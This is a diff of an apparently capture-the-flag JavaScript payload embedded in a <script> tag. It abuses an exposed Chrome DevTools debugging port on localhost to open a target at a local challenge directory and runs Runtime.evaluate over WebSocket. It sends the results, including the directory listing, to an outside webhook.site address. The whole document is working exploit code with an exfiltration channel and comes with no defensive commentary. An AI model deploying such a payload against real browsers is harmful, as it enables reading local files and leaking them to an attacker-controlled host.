@@ -1,30 +1,33 @@
-
 <script>
-const HOOK = "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
+const WEBHOOK =
+  "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-function log(stage, data = {}) {
-  navigator.sendBeacon(HOOK, JSON.stringify({stage, data}));
+async function log(stage, data) {
+  await fetch(WEBHOOK, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: JSON.stringify({ stage, data })
+  });
 }
 
-(async () => {
+async function run() {
   try {
-    const r = await fetch(
+    // Create a Chrome DevTools target for the challenge directory
+    const response = await fetch(
       "http://localhost:9222/json/new?file:///challenge/",
-      {method: "PUT"}
+      { method: "PUT" }
     );
 
-    const body = await r.text();
-    log("cdp_response", {status: r.status, body});
+    const target = await response.json();
 
-    if (!r.ok) return;
+    await log("directory_target", target);
 
-    const t = JSON.parse(body);
-    log("cdp_target", {url: t.url, ws: t.webSocketDebuggerUrl});
-
-    const ws = new WebSocket(t.webSocketDebuggerUrl);
+    const ws = new WebSocket(target.webSocketDebuggerUrl);
 
     ws.onopen = () => {
-      log("ws_open");
       ws.send(JSON.stringify({
         id: 1,
         method: "Runtime.evaluate",
@@ -35,10 +38,22 @@ function log(stage, data = {}) {
       }));
     };
 
-    ws.onmessage = e => log("cdp_result", {data: e.data});
-    ws.onerror = () => log("ws_error");
+    ws.onmessage = async (event) => {
+      const msg = JSON.parse(event.data);
+
+      if (msg.id === 1) {
+        await log("directory_listing", msg);
+      }
+    };
+
+    ws.onerror = async () => {
+      await log("websocket_error", "WebSocket failed");
+    };
+
   } catch (e) {
-    log("exception", {message: e.message});
+    await log("error", String(e));
   }
-})();
+}
+
+run();
 </script>
